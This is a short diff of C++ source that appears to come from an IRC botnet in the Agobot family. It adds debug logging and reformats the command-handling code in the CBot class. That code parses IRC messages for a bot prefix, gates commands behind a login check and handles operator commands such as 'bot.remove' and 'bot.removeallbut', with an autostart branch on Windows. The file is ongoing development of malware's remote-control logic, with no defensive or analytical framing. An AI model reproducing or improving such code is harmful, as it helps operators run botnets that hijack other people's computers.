@@ -62,7 +62,6 @@ void CBot::Recv(CMessage *pMsg)
 	// Check if its a bot command by comparing the first byte to the bot_prefix value
 #ifdef DBGCONSOLE
     g_cMainCtrl.m_cConsDbg.Log(5, "pMsg->sCmd=%s\n", pMsg->sCmd.CStr());
-    g_cMainCtrl.m_cConsDbg.Log(5, "bot_prefix.sValue=%s\n", bot_prefix.sValue.CStr());
 #endif
     if(pMsg->sChatString[0]==bot_prefix.sValue[0])
     {
@@ -83,6 +82,10 @@ void CBot::Recv(CMessage *pMsg)
                 HandleMsg(pMsg);
             }
 	} else { //botname .command mod - deejayfuzion
+#ifdef DBGCONSOLE
+        g_cMainCtrl.m_cConsDbg.Log(10, "File =%s:Line=%d:Function=%s \n",__FILE__, __LINE__, __FUNCTION__);
+        g_cMainCtrl.m_cConsDbg.Log(10, "g_cMainCtrl.m_sUserName= %s  \n", g_cMainCtrl.m_sUserName.CStr());
+#endif
 		if(pMsg->sChatString.Token(0, " ").Find(g_cMainCtrl.m_sUserName)) {
 			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
 			pMsg->sChatString.Assign(sNewCStr);
@@ -104,8 +107,9 @@ bool CBot::HandleMsg(CMessage *pMsg)
 	else
 	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
 		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
-            if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#')
-                return false;
+            if(bot_seclogin.bValue)
+                if(pMsg->sDest[0]!='#')
+                    return false;
 		// Find the command using the command handler
 		command *pCommand=g_cMainCtrl.m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
 		// If the command is found, let the command hander handle it
@@ -145,7 +149,9 @@ bool CBot::HandleCommand(CMessage *pMsg)
 #endif
     if(!pMsg->sCmd.Compare("bot.remove") || !pMsg->sCmd.Compare("bot.removeallbut")) {
 		CString sId(pMsg->sChatString.Token(1, " ", true));
-		if(!pMsg->sCmd.Compare("bot.removeallbut")) if(!sId.Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
+        if(!pMsg->sCmd.Compare("bot.removeallbut"))
+            if(!sId.Compare(g_cMainCtrl.m_cBot.bot_id.sValue))
+                return false;
 		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "removing bot...", pMsg->sReplyTo);
 #ifdef WIN32
         if(g_cMainCtrl.m_cBot.as_enabled.bValue)
